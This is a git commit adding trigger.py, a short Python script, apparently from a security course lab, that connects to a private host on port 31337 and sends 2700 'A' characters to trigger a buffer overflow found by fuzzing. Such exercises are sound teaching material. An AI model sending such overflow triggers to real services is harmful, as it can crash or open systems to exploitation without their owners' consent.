031be705e6c4786d64c5be86d687deddfa2ef125
Mitch Lacy <mrlacy@uwm.edu>
2018-08-28 05:06:56 -0700

    Create trigger.py

---
+++ trigger.py
@@ -0,0 +1,11 @@
+1 #!/usr/bin/env python  
+import socket  
+RHOST = "172.17.24.132"
+RPORT = 31337 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+s.connect((RHOST, RPORT)) 
+lenFromFuzz = 2700 #get this from fuzzing
+buf = ""
+buf += "A"*lenFromFuzz  
+buf += "\n"  
+s.send(buf)
